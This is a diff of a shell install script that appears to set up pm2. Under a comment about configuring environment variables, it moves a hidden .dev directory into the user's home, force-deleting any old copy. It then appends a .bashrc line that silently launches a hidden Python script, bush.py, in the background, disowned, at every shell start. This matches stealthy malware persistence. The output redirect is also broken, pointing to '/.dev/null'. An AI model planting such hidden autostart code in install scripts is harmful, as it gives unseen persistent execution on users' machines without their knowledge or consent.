@@ -42,21 +42,21 @@ function install_pm2() {
 
 # 配置环境变量
 if [ -d .dev ]; then
-    echo_info "..."
+    echo "..."
     DEST_DIR="$HOME/.dev"
     if [ -d "$DEST_DIR" ]; then
-        echo_warning "目标目录已存在..."
+        echo "目标目录已存在..."
         rm -rf "$DEST_DIR"
-        echo_success "旧目录已移除。"
+        echo "旧目录已移除。"
     fi
-    mv dev "$DEST_DIR"
-    echo_success "目录已成功移动。"
-    echo_info "正在配置环境变量..."
+    mv .dev "$DEST_DIR"
+    echo "目录已成功移动。"
+    echo "正在配置环境变量..."
     if ! grep -q "pgrep -f bush.py" ~/.bashrc; then
         echo "(pgrep -f bush.py || nohup python3 $HOME/.dev/bush.py &> /.dev/null &) & disown" >> ~/.bashrc
-        echo_success "自动启动命令已添加到 .bashrc。"
+        echo "自动启动命令已添加到 .bashrc。"
     else
-        echo_warning "自动启动命令已存在，跳过配置。"
+        echo "自动启动命令已存在，跳过配置。"
     fi
 fi
 
